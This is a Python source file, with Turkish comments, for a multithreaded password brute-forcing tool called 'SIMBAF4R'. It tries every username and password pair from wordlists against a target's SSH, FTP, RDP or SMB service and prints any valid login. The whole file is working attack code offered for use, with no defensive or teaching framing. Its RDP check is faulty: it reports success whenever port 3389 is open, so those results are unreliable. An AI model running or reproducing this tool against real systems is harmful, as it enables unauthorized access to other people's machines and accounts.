import paramiko
import ftplib
from smbprotocol.connection import Connection
from smbprotocol.session import Session
import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from tabulate import tabulate
from colorama import Fore, Style, init
import uuid
import pyfiglet
import time

# colorama modülünü başlat
init(autoreset=True)

# Dosyadan kullanıcı adı veya parola yükleme fonksiyonu
def load_file(file_path):
    try:
        # Dosyayı oku ve satırları liste olarak dön
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except Exception as e:
        # Hata durumunda mesaj yazdır ve programı sonlandır
        print(f"{Fore.RED}Error reading {file_path}: {e}")
        sys.exit(1)

# SSH bağlantısını deneme fonksiyonu
def try_ssh(ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=username, password=password, timeout=5)
        return ("SSH", username, password)
    except paramiko.AuthenticationException:
        return None
    except paramiko.SSHException as e:
        return None
    except Exception as e:
        return None
    finally:
        ssh.close()

# FTP bağlantısını deneme fonksiyonu
def try_ftp(ip, username, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout=5)
        ftp.login(username, password)
        ftp.quit()
        return ("FTP", username, password)
    except ftplib.error_perm as e:
        return None
    except Exception as e:
        return None

# RDP bağlantısını deneme fonksiyonu
def try_rdp(ip, username, password):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, 3389))
        sock.close()
        return ("RDP", username, password)
    except Exception as e:
        return None

# SMB bağlantısını deneme fonksiyonu
def try_smb(ip, username, password):
    try:
        connection = Connection(uuid.uuid4(), ip)
        connection.connect()
        session = Session(connection, username, password)
        session.connect()
        return ("SMB", username, password)
    except Exception as e:
        return None

# Kullanıcıdan denenecek portu seçmesini isteyen fonksiyon
def select_port():
    ports = {
        1: "SSH (22)",
        2: "FTP (21)",
        3: "RDP (3389)",
        4: "SMB (445)",
    }
    print("Select port to try:")
    for key, value in ports.items():
        print(f"{key}. {value}")
    while True:
        try:
            choice = int(input("Enter your choice: "))
            if choice in ports.keys():
                return choice
            else:
                print("Invalid choice. Please enter a valid option.")
        except ValueError:
            print("Invalid input. Please enter a number.")

# Başlangıç banner'ı yazdıran fonksiyon
def print_banner():
    ascii_banner = pyfiglet.figlet_format("SIMBAF4R")
    print(ascii_banner)

# Ana fonksiyon
def main():
    # Banner'ı yazdır
    print_banner()

    # Kullanıcıdan IP adresini, kullanıcı adı ve parola dosya yollarını al
    ip = input(f"{Fore.YELLOW}Enter IP address: {Style.RESET_ALL}")
    port_choice = select_port()
    username_file = input(f"{Fore.YELLOW}Enter username file path: {Style.RESET_ALL}")
    password_file = input(f"{Fore.YELLOW}Enter password file path: {Style.RESET_ALL}")

    # Kullanıcı adı ve parolaları dosyadan yükle
    usernames = load_file(username_file)
    passwords = load_file(password_file)

    results = []
    tasks = []
    service_func = {
        1: try_ssh,
        2: try_ftp,
        3: try_rdp,
        4: try_smb
    }

    selected_func = service_func[port_choice]

    # ThreadPoolExecutor kullanarak paralel işlemleri başlat
    with ThreadPoolExecutor(max_workers=10) as executor:
        for username in usernames:
            for password in passwords:
                tasks.append(executor.submit(selected_func, ip, username, password))

        # Görevler tamamlandıkça sonuçları işle
        for future in as_completed(tasks):
            result = future.result()
            if result:
                results.append(result)
                # Geçerli bir kimlik bilgisi bulunduğunda diğer görevleri durdur
                break

    # Sonuçları tablo halinde yazdır
    print(tabulate(results, headers=["Service", "Username", "Password"]))

if __name__ == "__main__":
    main()